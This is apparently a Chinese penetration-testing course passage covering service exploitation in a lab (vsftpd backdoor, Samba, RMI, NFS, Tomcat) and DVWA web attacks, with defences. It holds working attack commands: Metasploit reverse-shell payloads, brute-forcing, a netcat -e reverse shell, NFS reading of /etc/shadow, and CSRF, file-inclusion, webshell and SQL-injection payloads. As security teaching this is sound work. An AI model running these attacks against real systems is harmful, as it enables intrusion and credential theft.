周知端口是众所周知的端口号，范围从0到1023，其中80端口分配给WWW服务，21端口分配给FTP服务等。我们在浏览器的地址栏里输入一个网址的时候是不必指定端口号的，因为在默认情况下WWW服务的端口是“80”。 动态端口 动态端口的范围是从49152到65535。之所以称为动态端口，是因为它一般不固定分配某种服务，而是动态分配。 注册端口 端口1024到49151，分配给用户进程或应用程序。这些进程主要是用户安装的程序。 端口Banner获取-nmap 使用Nmap扫描指定主机的端口信息，并返回Banner。nmap IP地址 -p 端口号 --script banner 端口Banner获取-dmitry 使用dmitry获取端口banner信息。dmitry -pb IP地址 端口Bannaer获取-netcat 使用netcat获取Banner信息：nc -nv IP地址 端口号 端口服务版本信息获取 利用Nmap获取目标系统的端口版本信息：nmap -p 端口号 -sV IP地址 操作系统版本信息获取 使用Nmap扫描指定主机的操作系统版本信息。nmap -O IP地址 在针对内容测试时，有授权的情况下，可以利用nmap对目标进行完整测试。nmap -A -v IP地址 第五阶段-漏洞扫描 漏洞扫描原理 漏洞扫描器对漏洞进行扫描，以验证具体目标是否存在对应的具体漏洞。但是也存在错误扫描，需要对扫描结果进行漏洞验证。 其实扫描器的原理大致相同都是通过发送对应的验证数据到目标具体服务进行验证。当收到目标返回的响应与存在漏洞的响应一致时，就表明存在漏洞。 漏洞扫描工具-nmap 使用nmap也可以进行漏洞扫描：nmap --script vuln 目标IP地址 漏洞扫描工具-nessus 使用Nessus进行漏洞扫描测试（系统、Web漏洞扫描） 漏洞利用metasploit 利用Metasploit对扫描到的漏洞加以利用 msfconsole #启动metasploit search vsftpd #查看vsftpd漏洞利用代码 Web应用程序漏洞扫描 针对Web应用程序的漏洞扫描其实就是每个扫描器读取自己的Payload进行探测。 Web漏洞扫描器：每个扫描器都有各自不同的Payload进行探测。（尽量使用2-3个以上扫描器进行扫描） Owasp-zap AWVS Appscan Nikto Burpsuite OWASP-ZAP漏洞扫描 OWASP-ZAP是OWASP组织开发的用于Web应用程序漏洞扫描器，免费开源，不断更新维护 nikto漏洞扫描 nikto -host IP地址对目标服务器进行漏洞扫描主要针对HTTP服务器。 第六阶段-漏洞利用 FTP漏洞利用 FTP协议介绍 文件传输协议（英文：File Transfer Protocol，缩写：FTP）是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP默认使用21号端口。 用户分类：1、Real用户 2、Administrator 3、Anonymous（匿名）用户 FTP文件传输格式：1、ASCII 2、二进制格式 利用FTP匿名登录漏洞 由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。使用nc 连接FTP（USER anonymous；PASS 随便） 利用FTP后门漏洞 Vsftpd2.3.4漏洞：当进行FTP认证时，如果用户名USER中包含:)，那么直接就触发监听6200端口的连接（nc 192.168.31.72 6200）的shell。 FTP安全配置 修改配置文件，禁止匿名用户登录。（Linux FTP修改：/etc/vsftpd.conf 设置anonymous_enable=NO） 对特定漏洞进行打补丁，或者设置防火墙禁止连接后门端口。 iptables -A INPUT -p tcp -dport 6200 -j DROP iptabels -A OUTPUT -p tcp sport 6200 -j DROP FTP用户名密码暴力破解 使用hydra暴力破解FTP登录hydra -L user.txt -P passwd.txt ftp://192.168.31.52 FTP用户名明文密码验证 FTP协议中用于用户认证的过程中，客户端与服务器端是通过明文进行交互信息。验证FTP登录过程中明文传输用户名和密码。可用Wireshark抓取 FTP用户名明文密码嗅探 利用arpspoof进行ARP嗅探 （网关欺骗：arpspoof -i eth0 网关 -t 目标IP Tip：【arpspoof：未找到命令；解决方法 apt-get install dsniff ssldump】 利用Wireshark进行流量嗅探 FTP登录之后做的事情 利用metasploit创建反弹shell上传到FTP服务器。可以利用setookit快速生成反弹shell。 ubuntu搭建ssh服务端 ubuntu下安装服务端：sudo apt-get install openssh-server SSH漏洞利用 ssh服务端服务启动与关闭 启动、状态获取、关闭 service ssh start service ssh status service ssh stop ubuntu搭建ssh客户端（也可以使用XShell） ubuntu下安装putty工具：sudo apt-get instai putty-tools ubuntu下安装putty：在软件中心搜索putty进行安装 客户端连接服务端 nmap获取ssh Banner信息 nmap -sV -p 22 IP地址 Metasploit获取ssh Banner信息 msfconsole #启动metasploit use auxiliary/scanner/ssh/ssh_version msf auxiliary(ssh_version)>set rhosts IP地址 msf auxiliary(ssh version)>set rport 22 msf auxiliary(ssh_version)>exploit nc获取 ssh Banner信息 nc IP地址 22 配置ssh规避Banner信息 在ssh配置文件/etc/ssh/sshd_config中新增一行。DebianBanner no【然后重启ssh服务 service ssh restart】 Medusa SSH弱口令破解 如果在设置SSH服务时，管理员设置了容易被猜解出来的用户名和密码（弱口令）。那么测试人员就可以使用对应的密码工具进行暴力破解弱口令。破解出来就可以使用对应的用户名和密码登录系统。 medusa -h IP地址 -U user.txt -P passwd.txt -M ssh SSH命令行工具登录 一般情况下Linux下都具有ssh客户端，用来登录ssh服务端。可以使用 ssh 用户名@IP地址然后根据提示输入密码。 Metasploit利用SSH登录反弹Shell 使用Metasploit可以进行ssh登录（破解），会自动建立对应的Bash shell连接。 msfconsole #启动melasploit msf > use auxiliary/scanner/ssh/ssh_login msf > show options #查看需要设置的选项 msf > set rhosts IP地址 msf > set username 用户名 msf > set password 密码 msf > show options msf > run #运行 msf > sessions -l #查看当前连接的shell msf > sessions -i 1 #建立ID为1的bash shell Metasploit获取Meterpreter Shell 利用获得的Bash shell，注入Metasploit中Meterpreter payload从而获取更强大功能的shell。 msf > sessions -l #查看当前连接的shell msf > sessions -u 1 #利用ID为1的shell注入反弹meterpreter playload SSH安全防御——SSH 修改默认端口 默认情况下，SSH使用22端口。为了安全，一般情况下都会修改默认端口。【修改后必须重启SSH服务】 sudo gedit /etc/ssh/sshd_config service ssh restart SSH安全防御——SSH设置PGP登录 默认情况下，SSH使用用户名和密码进行远程登录。但也可以使用密钥对进行身份验证登录（公钥与私钥）。 生成SSH密钥对，使用puttygen。 下载链接：https://www.puttygen.com/download-putty 使用ssh-keygen命令在Linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys，并复制私钥文件到.ssh目录下。使用命令puttygen -L “要拷贝的私钥文件名”，将内容拷贝到authorized_keys文件中。 使用Putty客户端加载私钥文件进行连接。 SSH安全防御——SSH防御暴力破解用户账号 在Linux下可以配置不能使用用户名和密码登录，只使用SSH PGP方式验证登录。以此规避SSH暴力破解。 sudo gedit /etc/ssh/sshd_config #PasswordAuthentication yes => PasswordAuthentication no service ssh restart 缺点：不能使用用户密码登录，很大程度上存在复杂操作。 SSH安全防御——Iptables设置阈值防止暴力破解 利用Iptables对多次连接验证错误，进行账户锁定120秒。 iptables -I INPUT -p tcp --dport 22 -i eth0 -m state --state NEW -m recent --set iptables -I INPUT -p tcp --dport 22 -i eth0 -m state --state NEW -m recent --update --seconds 120 --hitcount 3 -j DROP 在设置完之后，需要重新启动ssh服务。 Telnet漏洞利用 Telnet介绍 Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。 虽然Telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，Telnet并不被重用。原因在于Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患、因此许多服务器都会选择禁用Telnet服务。如果我们要使用Telnet的远程登录，使用前应在远端服务器上检查并设置允许Telnet服务的功能。 Telnet服务端默认情况下使用23端口。 telnet版本获取 使用nmap获取telnet版本信息nmap -p23 -sV 192.168.31.72，或者使用metasploit获取对应版本信息use auxiliary/scanner/telnet/telnet_version telnet密码破解 使用metasploit下针对telnet破解的模块进行用户名和密码的破解。 在msfconsole下使用search telnet进行查询telnet可以利用的模块。 telnet登录测试 使用破解好的会话连接telnet，并执行对应命令。 使用sessions -l列举建立的会话；使用sessions -i id使用对应的会话。 telnet客户端连接telnet服务器 windows下开启telnet客户端，连接telnet服务端。 telnet明文密码传输 使用wireshark抓取telnet数据包。 msf登录telnet 在metasploit中使用telnet_login进行登录，并使用session -i id连接shell。 msf连接shell下载exp 使用wget进行下载。wget http://www.exploit-db.com/download/8572 【需将文件最后一行去掉，否则执行编译时会报错。】 设置kali nc监听 使用netcat 进行监听后期返回的shell。nc -lvp 4444 编译执行exp，获取root gcc 源文件名 -o exploit echo '#!/bin/sh' > /tmp/run echo '/bin/netcat -e /bin/sh IP地址 4444' >> /tmp/run ps aux | grep udev #显示一个root权限的进程 ./exploit 数字pid-1 #执行exploit,具有root权限的pid-1 SMTP漏洞利用 邮件发送与接受模型 邮件发送使用smtp协议，占用25端口。而邮件接收使用pop3或imap协议，分别占用110和143端口。 添加主机名和域名 为了在本地搭建好邮件服务器，所以需要修改对应内容。使得可以在本地进行域名解析。 sudo gedit /etc/hosts 127.0.0.1 mail.test.lab test sudo gedit /etc/hostname test 修改完成之后使用reboot进行重启，使得修改生效。 使用hostname 或hostname -f查看修改是否成功。 ubuntu 安装postfix 因为postfix是非常流行的smtp软件，所以ubuntu的主要库中集成了postfix，可以直接使用以下命令安装：sudo apt-get install postfix 修改配置文件：sudo gedit /etc/postfix/main.cf 追加子网信息 mynetworks = 127.0.0.0/8 192.168.1.0//24 inet_protocols = ipv4 home_maillbox = Maildir/ 修改完成之后重新启动服务postfix：sudo service postfix restart，然后使用netstat -nlv来查看对应25端口是否开启。 ubuntu安装dovecot sudo apt-get install dovecot-imapd dovecot-pop3d sudo gedit /etc/dovecot/conf.d/10-auth.conf disable_plaintest auth = yes auth_mechanisms = plain login sudo gedit /etc/dovecot/conf.d/10-mail.conf mail_location = maildir:/home/%u/Maildir sudo gedit /etc/dovecot/conf.d/10-master.conf 设置开启port = 143 port = 110 修改权限 sudo gedit /etc/dovecot/conf.d/10-master.conf unix_listerner auth-usrdb{ mode = 0600 user = postfix group = postfix } 重新启动dovecot服务sudo service dovecot restart使用netstat -nlv查看服务端口110、143是否开启 telnet测试用户名 telnet IP地址 端口 vrfy test@mail.test.lab metasploit测试用户名（字典内容为完整邮件名） 在metasploit中有smtp-enum可以对smtp上用户名进行枚举。 use auxiliary/scanner/smtp/smtp_enum msf auxiliary(smtp_enum) > set rhosts 192.168.1.107 msf auxiliary(smtp_enum) > set rport 25 msf auxiliary(smtp_enum) > set USER_FILE /root/Desktop/user.txt msf auxiliary(smtp_enum) > exploit smtp-user-enum测试用户名 smtp-user-enum专门用来进行smtp用户名枚举的工具。 smtp-user-enum -M VRFY -U /root/Desktop/user.txt -t 目标IP地址 ismtp测试用户名 ismtp -h IP地址:25 -e /root/Desktop/email.txt smtp版本信息获取 使用metasploit中的smtp-version模块探测smtp服务的版本信息。 medusa工具介绍 medusa是一款用来破解不同协议用户名和密码的专用软件。 smtp验证方式 参考链接：https://en.wikipedia.org/wiki/SMTP_Authentication medusa破解smtp medusa -h 目标IP地址 -u 用户名 -P 字典文件 -M 协议模块 rpcbind漏洞利用 rpcbind介绍 通俗的来说，rpcbind是NFS（网络文件系统Network File System）中用来进行消息通知的服务。 一般情况下rpcbind运行在111端口。并且NFS配置开启rpcbind_enable=\"YES\" 探测目标rpcbind 使用nmap -sV -p 111 IP地址探测目标rpcbind版本信息。 nmap脚本探测 在nmap中使用nmap -p 111 --script=rpcinfo 目标IP地址来探测目标的rpcinfo信息。 metasploit模块探测 使用metasploit下的auxiliary/scanner/misc/sunrpc_portmapper 进行目标探测。 Samba漏洞利用 Samba介绍 Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。一般运行在139、445端口。 探测目标Samba 使用nmap -sV -p 139,44 IP地址探测目标端口服务版本信息。 metasploit漏洞利用 在Metasploit中集成了利用samba usermap RCE的脚本。 exploit/mulit/samba/usermap_script set rhosts 192.168.43.235 show payloads set payload cmd/unix/reverse set lhost 192.168.43.80 exploit 防御修复 在Metasploit中show info可以查看漏洞信息。 修复方案：升级samba。 rlogin漏洞利用 rlogin介绍 远程登录（rlogin）是一个UNIX命令，它允许授权用户进入网络中的其它UNIX机器并且就像用户在现场操作一样。一旦进入主机，用户可以操作主机允许的任何事情。默认512、513端口 探测目标rlogin 使用 nmap -sV -p 512,513 IP地址探测目标login版本信息。 512用于对远程执行的进程进行验证、513反弹bash shell。 rlogin最高权限登录 使用 rlogin -l root IP地址使用root权限登录系统 防御修复 添加root登录验证密码。 关闭rlogin服务，改用ssh等来管理服务器。 反序列化远程命令执行漏洞 Java rmi介绍 Java RMI指的是远程方法调用（Remote Method Invocation）。它是一种机制，能够让在某个Java虚拟机上的对象调用另一个Java虚拟机中的对象上的方法。 RMI是J2SE的一部分，能够让程序员开发出基于JAVA的分布式应用。一个RMI对象是一个远程JAVA对象，可以从另一个JAVA虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地JAVA对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。 对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于class path中的可序列化类来反序列化。 RMI的传输100%基于反序列化。 默认端口1099 探测目标rmi 使用nmap -sV -p 1099 IP地址探测目标的版本信息。 rmi远程命令执行利用 使用Metasploit 对rmi RCE漏洞利用。 use exploit/multi/misc/java_rmi_server set rhosts 192.168.43.235 set lhost 192.168.43.80 show payloads set payloads java/meterpreter/reverse_tcp exploit sessions -l sessions -i 1 防御修复 存在反序列化传输。【特别注意是否会执行系统命令】 存在有缺陷的第三方库如commons-collections，及时升级库。 后门连接 后门连接探测 某些情况下，服务器可能已经存在某些后门。可以使用Nmap进行探测。nmap -sV 192.168.43.235 -p 某些端口 nc连接后门获取权限 nc 目标IP 端口号连接后门程序 NFS漏洞利用 NFS介绍 NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。默认2049端口 探测目标NFS nmap --script=nfs-* IP地址 探测NFS是否可以导出 使用showmount命令确是\"/\"共享（文件系统的根）是否正在导出。可能需要安装nfs-common包才能使用“showmount” apt-get install nfs-common showmount -e IP地址 查看导出内容 mkdir nfs_root mount -t nfs IP地址:/ ~/nfs_root -o nolock cat ~/nfs_root/etc/shadow #查看密码文件 proFTPD漏洞利用 proFTPD介绍 ProFTPD：一个Unix平台上或是类Unix平台上（如Linux，FreeBSD等）的FTP服务器程序http://www.proftpd.org/ 默认端口2121 探测目标proFTPD 使用nma -sV -p 2121 IP地址探测目标proftpd版本信息。 exploit-db搜索目标漏洞 在https://www.exploit-db.com/输入对应软件及版本搜索是否有漏洞。 msf暴力破解密码 使用metasploit下的auxiliary/scanner/tp/ftp_login 进行目标探测。 MySQL漏洞利用 MySQL介绍 MySQL是个关系型数据库管理系统，由瑞典MySQLAB公司开发，目前属于Oracle旗下产品。 MySQL是最流行的关系型数据库管理系统之一，在WEB应用方面，MySQL是最好的RDBMS（Relational Database Management System，关系数据库管理系统）应用软件。 MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。 官网：https://www.mysql.com/ 默认端口**3306** 探测目标mysql 使用nmap -sV -p 3306 IP地址探测目标mysql版本信息。 msf破解mysql密码 使用msf下的mysql_login模块破解mysql登录用户名和密码。 登录数据库查看数据 使用mysq -h IP地址 -u root登录数据库系统 postgresql漏洞利用 postgresql介绍 PostgreSQL是以加州大学伯克利分校计算机系开发的POSTGRES，现在已经更名为PostgreSQL，版本4.2为基础的对象关系型数据库管理系统（ORDBMS）。PostgreSQL支持大部分SQL标准并且提供了许多其他现代特性：复杂查询、外键、触发器、视图、事务完整性、MVCC。同样，PostgreSQL可以用许多方法扩展，比如，通过增加新的数据类型、函数、操作符、聚集函数、索引。免费使用、修改、和分发PostgreSQL，不管是私用、商用、还是学术研究使用。默认端口5432 https://www.postgresql.org/ 探测目标postgresql 使用nmap -sV -p 5432 IP地址探测目标postgresql版本信息。 msf暴力破解postgresql 在msf下使用postgresql_login模块破解系统登录用户名和密码。 登录数据库查看数据 利用pgadmin客户端软件登陆postgresql postgresql代码执行利用 利用msf下postgresql的代码执行获得反弹shell。use exploit/linux/postgres/postgres_payload 防御修复 防御：屏蔽任意IP连接Postgresql 修复：升级版本，安全配置 VNC漏洞利用 VNC介绍 VNC（Virtial Network Console）是虚拟网络控制台的缩写。它是一款优秀的远程控制工具软件，由著名的AT&T的欧洲研究实验室开发的。可视化控制，类似于远程桌面，默认vnc服务端运行在5900端口 探测目标vnc 使用nmap -sV -p 5900 IP地址探测目标vnc版本信息。 msf破解vnc密码 在msf下vnc_login模块可用来对vnc服务端认证用户名和密码进行破解。 vnc客户端登陆 windows下安装vnc viewer客户端软件连接VNC服务端。 IRC漏洞利用 IRC介绍 IRC是Internet Relay Chat的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。经过十年的发展，目前世界上有超过60个国家提供了IRC的服务。IRC的工作原理非常简单，您只要在自己的PC上运行客户端软件，然后通过因特网以IRC协议连接到一台IRC服务器上即可。它的特点是速度非常之快，聊天时几乎没有延迟的现象，并且只占用很小的带宽资源。所有用户可以在一个被称为\"Channel”（频道）的地方就某一话题进行交谈或密谈。每个IRC的使用者都有一个Nickname（昵称）。 默认情况下，irc服务器运行在6667端口。 探测目标irc 使用nmap -sV -p 6667 IP地址探测目标irc版本信息。 msf利用irc后门 使用searchsploit查找可以利用的POC。 searchsploit irc版本 利用msf中对于irc后门连接的模块，连接shell。use exploit/unix/irc/unreal_ircd_3281_backdoor 防御修复 升级软件版本 更换其他软件 Tomcat漏洞利用 tomcat介绍 Tomcat服务器是一个免费的开放源代码的Web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP程序的首选。默认情况下，8180端口是tomcat管理的HTTP端口。 探测目标tomcat 使用nmap -sV -p 8180 IP地址探测目标tomcat版本信息。 msf破解tomcat密码 msf下的auxiliary/scanner/http/tomcat_mgr_login 模块来对tomcat管理登陆密码进行破解。 msf利用tomcat管理 在msf下可以使用use exploit/multi/http/tomcat_mgr_deploy模块利用tomcat upload功能反弹shell。 第七阶段-DVWA 介绍 Web应用程序（DVWA）是一个PHP/MySQL Web应用程序。它的主要目标是帮助安全专业人员在合法环境中测试他们的技能和下具，帮助web开发人员更好地理解保护web应用程序的过程，并帮助教师/学生在教室环境中教授/学习web应用程序安全性。http://www.dvwa.co.uk/ 实验环境操作 默认情况下，DVWA系统登陆的用户admin，密码password 参考教程 https://www.freebuf.com/author/lonehand 切换难度操作 DVWA环境中可以通过DVWA Security难度按钮，切换不同的难度。 home介绍 DVWA的目的是实践一些最常见的Web漏洞，具有各种各样的困难级别。DVWA还包括一个Web应用防火墙（WAF），PHPID，它可以在任何阶段启用，以进一步增加难度。这将演示如何添加另一层安全性可以阻止某些意行为。注意，也有各种公共方法绕过这些保护（因此，这可以看作是对更高级用户的扩展）！在每个页而的底部都有一个帮助按钮，它可以让您查看该漏洞的提示和提示。还有更多的链接用于进一步的背景阅读，这涉及到安全问题。 Brute Force暴力破解 利用BurpSuite进行暴力破解 防御： 设置token机制，设置验证码 设置登录失败次数和锁定时间 过滤用户输入，防止SQL注入 Command Injection命令执行 Comimand Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。 Windows下执行下列命令： 执行ping 127.0.0.1 && ipconfig，依次执行两条命令 执行ping 127.0.0.1 || ipconfig，若第一条命令正确，则只执行第一条命令；若错误则执行下一条命令 执行ping 127.0.0.1 | ipconfig，只执行第二条命令 执行ping 127.0.0.1 ; ipconfig，Windows下\";\"为错误参数 防御： 过滤黑名单 替换、转义关键字 对于IP地址，可以用\".\"为分界，将所有数字拆分到数组，单个判断是否为数字is_numeric() CSRF跨站伪造请求攻击 CSRF介绍 CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。 CSRF-low级别漏洞利用 构造恶意链接：http://none.org.cn:81/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change# 当用户在当前cookie没有过期时，点击该链接完成用户密码修改 使用短链接伪装http://dwz.cn 当然，也可以在burp上构造poc，选中截断的内容，右键Engagement===>Generate CSRF poC CSRF-low级别漏洞高级利用 构造恶意页面，使用img标签隐藏真实目的 404 file not found. 用户使用浏览器访问该页面时，就会被修改。 注意：如果用户用A浏览器访问站点，又使用B浏览器访问恶意页面，不会触发漏洞。 CSRF-medium级别漏洞利用 过滤规则是http包头的Referer参数的值中必须包含服务器的主机名 这里可以将攻击页面命名为none.org.cn.html，然后通过链接跳转到此页面就可以绕过了 CSRF-high级别漏洞利用 High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。 只有获取token才能进行CSRF，但是浏览器存在同源策略，不能直接获取，所以比较难以利用。但是如果服务器存在存储XSS可以来获取token。然后构造url和代码进行CSRF利用。 一般情况下，在CSRF中使用token，可以防御大部分CSRF利用。 CSRF-impossible级别【防御】 Impossible级别的代码，加入了Anti-CSRF token机制，利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。 File Inclusion文件包含 文件包含漏洞介绍 文件包含：开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含。 File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。 文件包含漏洞通常配合文件上传来获取webshell 目录遍历与文件包含的区别：目录遍历是可以读取web目录以外的其他目录,根源在于对路径访问权限设置不严格，针对本系统。文件包含是利用函数来包含web目录以外的文件，分为本地包含和远程包含。 特征： ?page=a.php ?home=b.html ?file=content 检测： ?file=../../../../etc/passwd ?page=file:///etc/passwd ?home=main.cgi ?page=http://www.a.com/1.php http://1.1.1.1/../../../../dir/file.txt File Inclusion_low级别漏洞利用 构造远程url，page=http://恶意ip/shell.php这里shell.php的后缀名为任意的组合，比如.txt，都会被尝试执行php。如果shell中不是php内容，则会直接显示对应的内容。 File Inclusion_medium级别代码分析 使用了str_replace()函数将\"http://\",\"https://\",\"../\",\"..\\\"替换成空字符 File Inclusion_medium级别漏洞利用 使用str_replace函数是极其不安全的，因为可以使用大小写绕过或者是双写绕过替换规则。例如：page=hthttps://tps://none.org.cn/test.txt时，str_replace函数会将http://删除，于是剩余内容拼接成`page=https://none.org.cn/test.txt`，或用大小写绕过`page=Https://none.org.cn/test.txt`，成功执行远程命令。例如：`http://none.org.cn:81/vulnerabilities/fi/?page=..././..././..././etc/passwd` File Inclusion_high级别代码分析 分析源码，意思是在参数不为include.php时，且参数不以file开头，则报错；确保了$file是以file开头。于是，我们可以利用 file 协议包含本地文件进行绕过，然后配合文件上传漏洞进行利用。 File Inclusion_high级别漏洞利用 http://none.org.cn:81/vulnerabilities/fi/?page=file:///etc/passwd File Inclusion_impossible级别代码分析&【防御】 基于白名单进行防御，确保page参数传递的只能是固定的文件名。 File Upload文件上传 文件上传漏洞介绍 File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得可以通过上传webshell获取服务器权限，因此文件上传漏洞带来的危害常常是毁灭性的。 文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。 File Upload_low级别代码分析&漏洞利用 Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } ?> basename(path,suffix) 函数，返回path中的文件名部分，如果可选参数suffix为空，则返回的文件名中包含后缀名，反之不包含后缀名。可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。 File Upload_medium级别代码分析 Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } ?> 可以看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。 File Upload_medium级别漏洞利用 抓包修改文件类型，将shell文件的后缀改为png后上传以绕过限制，然后用burpsuite抓包将文件后缀改回php，然后用蚁剑连接即可。 配合文件包含进行利用，在shell文件头添加GIF98，后缀改为jpg然后上传即可，配合上文件包含漏洞http://none.org.cn:81/vulnerabilities/fi/?page=hTTp://none.org.cn:81/hackable/uploads/test2.jpg加上cookie后用蚁剑连接即可。 File Upload_high级别代码分析 Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } ?> getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。代码使得上传的后缀名只能是jpg、jpeg、png，否则上传失败。其中getimagesize用来检测文件头。 File Upload_high级别漏洞利用 在shell文件头添加GIF98以绕过文件头检测，后缀改为jpg然后上传即可，接着利用文件包含漏洞http://none.org.cn:81/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/test3.jpg加上cookie后用蚁剑连接即可。 利用图片马绕过，cmd输入copy 5.jpg /b + test3.txt /a shell.jpg得到shell.jpg然后上传，接着利用文件包含漏洞http://none.org.cn:81/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/shell.jpg加上cookie后用蚁剑连接即可。 copy 5.jpg /b + test3.txt /a shell.jpg 使用CMD制作一句话图片马。 参数/b指定以二进制格式复制、合并文件，用于图像类/声音类文件 参数/a指定以ASCII格式复制、合并文件，用于txt等文档类文件 File Upload_impossible级别代码分析&【防御】 取文件最后的扩展名。 $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 对上传文件进行重命名（为md5值，使得%00截断无法绕过过滤规则）。 $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 采取白名单方式验证文件的后缀名，MIME-TYPE类型，以及文件大小。以及检查是否为真正图片。 if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && ( $uploaded_size GD库或image-magick进行二次渲染，洗掉图片中的恶意代码。 $img = imagecreatefrompng( $uploaded_tmp ); 采用相对路径回显到前端页面。 if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) 加入Anti-CSRF token防护CSRF攻击。 checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); ${target_file} succesfully uploaded!\"; } else { // No echo 'Your image was not uploaded.'; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } // Generate Anti-CSRF token generateSessionToken(); ?> SQL Injection注入 SQL注入介绍 SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 形成SQL注入漏洞的原因： 用户输入不可控 输入内容被带入SQL语句执行 字符型注入or数字型注入判断 当输入的参数为字符串时，并且存在注入，可称为字符型注入，字符型和数值型的区别在于数值不需要单引号闭合，而字符型都需要单引号闭合。 例如： 字符型：select * from news where user='admin'; 数字型：select * from news where id=1; 以上可以看出，在构造payload的时，若注入1'报错，1' #不报错，则为字符型注入；若两个都报错则为数字型注入。（在符号未被转义的情况下，可以通过此方法简单判断） SQL注入可以使用自动化的注入神器sqlmap进行自动化注入，下面只是简要介绍手工注入，具体内容可以查看freebuf教程。 SQL Injection_low级别代码分析 ' . mysql_error() . '' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } mysql_close(); } ?> 可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。 SQL Injection_low级别漏洞利用 直接注入：' or 1=1 #，可以看到返回了多个结果，说明存在字符型注入。 SQL Injection_medium级别代码分析 ' . mysql_error() . '' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } //mysql_close(); } ?> 可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号\\x00，\\n，\\r，\\，'，\"，\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 SQL Injection_medium级别漏洞利用 虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。 抓包更改参数' or 1=1 #时报错，改为1 or 1=1 